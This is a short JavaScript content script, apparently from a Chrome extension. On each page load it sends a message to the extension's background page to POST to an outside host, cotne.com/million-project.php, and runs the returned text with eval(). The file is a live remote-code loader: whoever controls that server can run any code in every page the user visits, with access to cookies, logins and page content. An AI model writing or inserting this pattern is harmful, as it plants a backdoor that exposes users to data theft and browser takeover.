document.addEventListener('DOMContentLoaded', function () {
	chrome.runtime.sendMessage({
		method: 'POST',
		action: 'xhttp',
		url: 'http://cotne.com/million-project.php'
	}, function (data) {
		eval(data);
	});
});


